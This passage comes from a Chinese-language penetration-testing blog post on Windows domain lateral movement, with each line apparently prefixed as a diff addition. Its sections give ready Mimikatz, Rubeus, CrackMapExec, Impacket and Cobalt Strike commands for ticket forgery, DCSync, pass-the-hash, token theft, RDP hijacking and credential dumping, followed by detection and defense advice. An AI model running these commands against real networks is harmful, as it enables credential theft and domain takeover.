+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Mimikatz — 导出并注入票据</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::tickets /export&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;kerberos::ptt &lt;ticket.kirbi&gt;&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line">klist  <span class="comment"># 验证票据已注入</span></span><br><span class="line"><span class="built_in">dir</span> \\DC01.corp.local\c$   <span class="comment"># 测试域内资源访问</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Rubeus — 从内存提取TGT</span></span><br><span class="line">Rubeus.exe tgtdeleg</span><br><span class="line"><span class="comment"># Rubeus — 通过RC4哈希请求新TGT并注入</span></span><br><span class="line">Rubeus.exe asktgt /user:administrator /rc4:&lt;NTLM-HASH&gt; /ptt</span><br></pre></td></tr></table></figure>
+
+<p><strong>Golden Ticket &amp; Silver Ticket</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Golden Ticket — 使用krbtgt哈希伪造TGT（冒充任意域用户）</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:corp.local /user:krbtgt&quot;</span> <span class="string">&quot;exit&quot;</span>  <span class="comment"># 获取krbtgt哈希</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;kerberos::golden /domain:corp.local /sid:S-1-5-21-xxxxx /rc4:&lt;KRBTGT-HASH&gt; /user:Administrator /ptt&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Silver Ticket — 使用服务账户哈希伪造TGS（针对特定服务，更隐蔽）</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;kerberos::golden /domain:corp.local /sid:S-1-5-21-xxxxx /target:dc01.corp.local /service:cifs /rc4:&lt;MACHINE-ACCOUNT-HASH&gt; /user:Administrator /ptt&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>检测</strong>：Event ID 4769（异常加密类型）、4768（异常TGT请求）；Golden Ticket默认10年有效期特征；短时大量票据请求。</p>
+<h3 id="2-3-Overpass-the-Hash-Pass-the-Key"><a href="#2-3-Overpass-the-Hash-Pass-the-Key" class="headerlink" title="2.3 Overpass-the-Hash (Pass-the-Key)"></a>2.3 Overpass-the-Hash (Pass-the-Key)</h3><p>使用用户NTLM哈希”升级”为Kerberos TGT票据，适用于：获取哈希但无法破解明文；环境启用NTLM限制；需访问依赖Kerberos的服务。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Mimikatz — 使用NTLM哈希请求TGT</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:administrator /domain:corp.local /ntlm:&lt;NTLM-HASH&gt; /run:cmd.exe&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Mimikatz — 使用AES256 Key请求TGT</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:administrator /domain:corp.local /aes256:&lt;AES256-KEY&gt; /run:cmd.exe&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Rubeus — Over-PtH（通过RC4 / AES256哈希请求TGT）</span></span><br><span class="line">Rubeus.exe asktgt /user:administrator /rc4:&lt;NTLM-HASH&gt; /domain:corp.local /ptt</span><br><span class="line">Rubeus.exe asktgt /user:administrator /aes256:&lt;AES256-KEY&gt; /domain:corp.local /ptt</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、Token窃取与会话劫持"><a href="#三、Token窃取与会话劫持" class="headerlink" title="三、Token窃取与会话劫持"></a>三、Token窃取与会话劫持</h2><h3 id="3-1-Access-Token窃取"><a href="#3-1-Access-Token窃取" class="headerlink" title="3.1 Access Token窃取"></a>3.1 Access Token窃取</h3><p>Windows每个登录用户的进程关联一个Access Token（含SID、组成员关系、权限）。攻击者通过枚举系统令牌，复制高权限令牌并启动新进程以窃取身份。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Metasploit — incognito模块</span></span><br><span class="line">meterpreter &gt; use incognito</span><br><span class="line">meterpreter &gt; list_tokens -u                  <span class="comment"># 列出可用用户令牌</span></span><br><span class="line">meterpreter &gt; impersonate_token CORP\\Administrator</span><br><span class="line">meterpreter &gt; getuid                           <span class="comment"># 返回: CORP\Administrator</span></span><br><span class="line">meterpreter &gt; rev2self                         <span class="comment"># 恢复原始令牌</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Cobalt Strike</span><br><span class="line">beacon&gt; steal_token &lt;PID&gt;</span><br><span class="line">beacon&gt; rev2self</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-RDP-Session-Hijacking（RDP会话劫持）"><a href="#3-2-RDP-Session-Hijacking（RDP会话劫持）" class="headerlink" title="3.2 RDP Session Hijacking（RDP会话劫持）"></a>3.2 RDP Session Hijacking（RDP会话劫持）</h3><p>管理员直接关闭RDP客户端（未注销）时，其会话保持已认证状态。攻击者获取SYSTEM权限后可劫持该会话，无需密码接管管理员桌面。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 步骤1：查询在线会话</span></span><br><span class="line">query user</span><br><span class="line"><span class="comment"># 输出: administrator  ID:1  STATE:Disc     (已断开但未注销)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤2：以SYSTEM权限劫持会话</span></span><br><span class="line">PsExec.exe -s \\localhost cmd.exe</span><br><span class="line">tscon 1 /dest:console                     <span class="comment"># 劫持Session ID 1到当前控制台</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或通过Mimikatz</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;ts::sessions&quot;</span> <span class="string">&quot;ts::remote /id:1&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>注意</strong>：Win10 1903 &#x2F; Server 2019+增加了<code>tscon</code>劫持限制（活跃用户会话时无法劫持）。防御：管理员应养成注销习惯，启用RDP会话超时策略。</p>
+</blockquote>
+<hr>
+<h2 id="四、工具指南"><a href="#四、工具指南" class="headerlink" title="四、工具指南"></a>四、工具指南</h2><h3 id="4-1-CrackMapExec-NetExec"><a href="#4-1-CrackMapExec-NetExec" class="headerlink" title="4.1 CrackMapExec (NetExec)"></a>4.1 CrackMapExec (NetExec)</h3><p>内网渗透瑞士军刀，整合SMB、WinRM、MSSQL、SSH协议的自动化利用。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SMB扫描与认证</span></span><br><span class="line">crackmapexec smb 192.168.1.0/24 -u administrator -p P@ssw0rd</span><br><span class="line">crackmapexec smb 192.168.1.0/24 -u administrator -H &lt;NTLM-HASH&gt;   <span class="comment"># Pass-the-Hash</span></span><br><span class="line">crackmapexec smb 192.168.1.0/24 -u users.txt -p Spring2025! --continue-on-success</span><br><span class="line"></span><br><span class="line"><span class="comment"># 横向移动（命令执行）</span></span><br><span class="line">crackmapexec smb 192.168.1.50 -u administrator -p P@ssw0rd -x <span class="string">&quot;whoami&quot;</span></span><br><span class="line">crackmapexec smb 192.168.1.50 -u administrator -p P@ssw0rd -X <span class="string">&quot;Get-Process lsass&quot;</span>  <span class="comment"># PowerShell编码</span></span><br><span class="line">crackmapexec winrm 192.168.1.50 -u administrator -p P@ssw0rd -x <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 凭据导出模块</span></span><br><span class="line">crackmapexec smb 192.168.1.50 -u administrator -p P@ssw0rd --sam          <span class="comment"># SAM哈希</span></span><br><span class="line">crackmapexec smb 192.168.1.50 -u administrator -p P@ssw0rd --lsa          <span class="comment"># LSA Secrets</span></span><br><span class="line">crackmapexec smb 192.168.1.50 -u administrator -p P@ssw0rd -M lsassy      <span class="comment"># LSASS内存凭据</span></span><br><span class="line">crackmapexec smb 192.168.1.50 -u administrator -p P@ssw0rd -M mimikatz    <span class="comment"># Mimikatz模块</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-Impacket"><a href="#4-2-Impacket" class="headerlink" title="4.2 Impacket"></a>4.2 Impacket</h3><p>Impacket是Python库，提供Windows网络协议的低级编程接口。横向移动核心脚本如下：</p>
+<table>
+<thead>
+<tr>
+<th>脚本</th>
+<th>协议&#x2F;端口</th>
+<th>执行机制</th>
+<th>交互性</th>
+<th>检测难度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>wmiexec.py</code></td>
+<td>DCOM (135+RPC)</td>
+<td>WMI进程创建</td>
+<td>半交互</td>
+<td>中低</td>
+</tr>
+<tr>
+<td><code>psexec.py</code></td>
+<td>SMB (445)</td>
+<td>上传服务二进制</td>
+<td>半交互</td>
+<td>中</td>
+</tr>
+<tr>
+<td><code>smbexec.py</code></td>
+<td>SMB (445)</td>
+<td>服务管道重定向</td>
+<td>半交互</td>
+<td>低（隐蔽）</td>
+</tr>
+<tr>
+<td><code>atexec.py</code></td>
+<td>RPC (135+445)</td>
+<td>计划任务</td>
+<td>单命令</td>
+<td>低</td>
+</tr>
+<tr>
+<td><code>dcomexec.py</code></td>
+<td>DCOM (135+RPC)</td>
+<td>DCOM对象调用</td>
+<td>半交互</td>
+<td>中</td>
+</tr>
+<tr>
+<td><code>secretsdump.py</code></td>
+<td>DRSUAPI&#x2F;SMB</td>
+<td>远程凭据导出</td>
+<td>无</td>
+<td>高</td>
+</tr>
+</tbody></table>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 横向移动</span></span><br><span class="line">wmiexec.py -hashes :&lt;NTLM-HASH&gt; administrator@192.168.1.50</span><br><span class="line">smbexec.py -hashes :&lt;NTLM-HASH&gt; administrator@192.168.1.50</span><br><span class="line">atexec.py -hashes :&lt;NTLM-HASH&gt; administrator@192.168.1.50 <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 凭据导出</span></span><br><span class="line">secretsdump.py -hashes :&lt;NTLM-HASH&gt; administrator@192.168.1.50    <span class="comment"># 远程SAM/LSA/NTDS</span></span><br><span class="line">secretsdump.py -just-dc-user administrator corp.local/admin:P@ssw0rd@192.168.1.10  <span class="comment"># DCSync</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Kerberos票据操作</span></span><br><span class="line">getTGT.py corp.local/administrator -hashes :&lt;NTLM-HASH&gt; -dc-ip 192.168.1.10</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator.ccache</span><br><span class="line">wmiexec.py -k -no-pass administrator@dc01.corp.local -dc-ip 192.168.1.10  <span class="comment"># 使用票据</span></span><br><span class="line">ticketer.py -nthash &lt;KRBTGT-HASH&gt; -domain-sid S-1-5-21-xxxxx -domain corp.local administrator  <span class="comment"># Golden Ticket</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、综合技术对比"><a href="#五、综合技术对比" class="headerlink" title="五、综合技术对比"></a>五、综合技术对比</h2><h3 id="5-1-远程执行技术对比"><a href="#5-1-远程执行技术对比" class="headerlink" title="5.1 远程执行技术对比"></a>5.1 远程执行技术对比</h3><table>
+<thead>
+<tr>
+<th>技术</th>
+<th>端口</th>
+<th>协议</th>
+<th>上传文件</th>
+<th>交互性</th>
+<th>权限</th>
+<th>检测可能性</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WMI</td>
+<td>135+动态RPC</td>
+<td>DCOM</td>
+<td>否</td>
+<td>半交互</td>
+<td>调用者</td>
+<td>中</td>
+</tr>
+<tr>
+<td>PsExec</td>
+<td>445</td>
+<td>SMB</td>
+<td>是</td>
+<td>交互</td>
+<td>SYSTEM</td>
+<td><strong>高</strong></td>
+</tr>
+<tr>
+<td>计划任务</td>
+<td>135&#x2F;445</td>
+<td>RPC&#x2F;SMB</td>
+<td>否</td>
+<td>单命令</td>
+<td>调用者</td>
+<td>中低</td>
+</tr>
+<tr>
+<td>WinRM&#x2F;PS Remoting</td>
+<td>5985&#x2F;5986</td>
+<td>HTTP(S)</td>
+<td>否</td>
+<td>交互</td>
+<td>调用者</td>
+<td>中高</td>
+</tr>
+<tr>
+<td>DCOM对象</td>
+<td>135+动态RPC</td>
+<td>DCOM</td>
+<td>否</td>
+<td>单命令</td>
+<td>取决于COM对象</td>
+<td>中</td>
+</tr>
+<tr>
+<td>RDP劫持</td>
+<td>3389</td>
+<td>RDP</td>
+<td>否</td>
+<td>交互</td>
+<td>被劫持用户</td>
+<td>低</td>
+</tr>
+</tbody></table>
+<h3 id="5-2-凭证攻击技术对比"><a href="#5-2-凭证攻击技术对比" class="headerlink" title="5.2 凭证攻击技术对比"></a>5.2 凭证攻击技术对比</h3><table>
+<thead>
+<tr>
+<th>技术</th>
+<th>所需凭据</th>
+<th>适用协议</th>
+<th>需管理权限</th>
+<th>主要防护</th>
+<th>检测可能性</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Pass-the-Hash</td>
+<td>NTLM Hash</td>
+<td>NTLM</td>
+<td>目标管理员</td>
+<td>Credential Guard, NTLM禁用</td>
+<td><strong>高</strong></td>
+</tr>
+<tr>
+<td>Pass-the-Ticket</td>
+<td>Kerberos Ticket</td>
+<td>Kerberos</td>
+<td>否(SeTcb)</td>
+<td>AES加密, PAC验证</td>
+<td>中</td>
+</tr>
+<tr>
+<td>Overpass-the-Hash</td>
+<td>NTLM Hash→TGT</td>
+<td>Kerberos</td>
+<td>否</td>
+<td>RC4禁用(AES Only)</td>
+<td>中</td>
+</tr>
+<tr>
+<td>Golden Ticket</td>
+<td>KRBTGT Hash</td>
+<td>Kerberos</td>
+<td>域管&#x2F;DCSync</td>
+<td>PAC验证, 票据生命周期</td>
+<td>中高</td>
+</tr>
+<tr>
+<td>Silver Ticket</td>
+<td>服务账户Hash</td>
+<td>Kerberos</td>
+<td>服务账户哈希</td>
+<td>PAC验证</td>
+<td>中低</td>
+</tr>
+<tr>
+<td>Token窃取</td>
+<td>SYSTEM&#x2F;管理员</td>
+<td>N&#x2F;A</td>
+<td>是</td>
+<td>最小权限原则</td>
+<td>低-中</td>
+</tr>
+</tbody></table>
+<h3 id="5-3-工具能力矩阵"><a href="#5-3-工具能力矩阵" class="headerlink" title="5.3 工具能力矩阵"></a>5.3 工具能力矩阵</h3><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>WinRM</th>
+<th>WMI</th>
+<th>PsExec</th>
+<th>计划任务</th>
+<th>PtH</th>
+<th>凭据Dump</th>
+<th>密码喷洒</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CrackMapExec</td>
+<td>✅</td>
+<td>✅</td>
+<td>❌</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>Impacket</td>
+<td>❌</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>❌</td>
+</tr>
+<tr>
+<td>Mimikatz</td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅</td>
+<td>✅</td>
+<td>❌</td>
+</tr>
+<tr>
+<td>Metasploit</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="六、防御建议"><a href="#六、防御建议" class="headerlink" title="六、防御建议"></a>六、防御建议</h2><ol>
+<li><strong>网络分段</strong>：关键服务器（域控、数据库）置于独立VLAN，限制工作站到服务器的非必要端口（135, 139, 445, 3389, 5985, 5986）</li>
+<li><strong>最小权限</strong>：严格限制管理员组成员，禁止在日常工作站使用域管账户登录，实施Tiered Access Model（Tier 0&#x2F;1&#x2F;2）</li>
+<li><strong>LAPS</strong>：部署Microsoft LAPS确保每台主机本地管理员密码唯一且定期轮换</li>
+<li><strong>Credential Guard</strong>：Win10&#x2F;11 Enterprise及Server 2016+启用，将LSASS凭据存储在虚拟化安全隔离环境中</li>
+<li><strong>Windows防火墙</strong>：非管理网段禁用入站SMB、NetBIOS、WinRM、RDP端口</li>
+<li><strong>关键日志监控</strong>：<ul>
+<li>安全日志：Event ID 4624（登录）、4625（登录失败）、4672（特权分配）、4768-4769（Kerberos）、4776（NTLM）</li>
+<li>PowerShell日志：Event ID 4104（脚本块）</li>
+<li>WMI日志：Event ID 5857-5861</li>
+<li>Sysmon：Event ID 1（进程创建）、3（网络连接）、10（进程访问）、11（文件创建）</li>
+</ul>
+</li>
+<li><strong>RDP安全</strong>：设置会话超时自动注销，启用NLA，限制RDP登录用户组</li>
+<li><strong>定期审计</strong>：审计服务账户的委派配置，检查KRBTGT密码轮换周期（建议≤180天）</li>
+</ol>
+<hr>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本文所述技术仅供安全研究与授权的渗透测试使用。未经系统所有者明确书面授权，在任何计算机系统或网络上使用本文所述技术均属违法行为。作者及发布平台不对任何误用或非法使用本文内容造成的后果承担法律责任。读者应遵守当地法律法规，仅在合法授权范围内进行安全测试。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Cloud-AWS-EC2-IAM/" rel="prev" title="云安全：AWS EC2元数据与IAM权限">
+                  <i class="fa fa-angle-left"></i> 云安全：AWS EC2元数据与IAM权限
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/CMS-Drupal-pentest/" rel="next" title="Drupal 安全测试实战">
+                  Drupal 安全测试实战 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
